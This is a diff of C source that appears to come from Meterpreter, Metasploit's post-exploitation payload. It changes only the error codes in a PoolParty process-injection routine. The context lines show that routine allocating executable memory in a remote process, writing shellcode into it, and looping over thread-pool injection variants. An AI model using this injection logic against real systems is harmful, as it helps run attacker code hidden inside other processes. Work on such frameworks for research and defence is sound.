@@ -520,7 +520,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 	
 
 	if (!supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch)) {
-		return ERROR_POOLPARTY_GENERIC;
+		return ERROR_INVALID_FUNCTION;
 	}
 
 	POOLPARTY_INJECTOR *poolparty = GetOrInitPoolParty(dwMeterpreterArch, dwDestinationArch);
@@ -534,7 +534,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			dwStubSize = sizeof(poolparty_stub_x64) - 1;
 		}
 		else {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on this target (yet)!", ERROR_POOLPARTY_GENERIC);
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on this target (yet)!", ERROR_INVALID_FUNCTION);
 		}
 
 		hTriggerEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
@@ -552,15 +552,15 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 		lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
 		if (!lpPoolPartyStub) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!", ERROR_POOLPARTY_GENERIC);
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!");
 		}
 		
 		if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!", ERROR_POOLPARTY_GENERIC);
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!");
 		}
 
 		if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!", ERROR_POOLPARTY_GENERIC);
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!");
 		}
 
 		for (UINT8 variant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION; variant < POOLPARTY_TECHNIQUE_COUNT; variant++) {
@@ -579,7 +579,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			}
 		}
 		if (dwResult != ERROR_SUCCESS) {
-			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: none of the supported variant worked.", ERROR_POOLPARTY_GENERIC)
+			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: none of the supported variant worked.", ERROR_INVALID_FUNCTION)
 		}
 
 		if (remote && response)
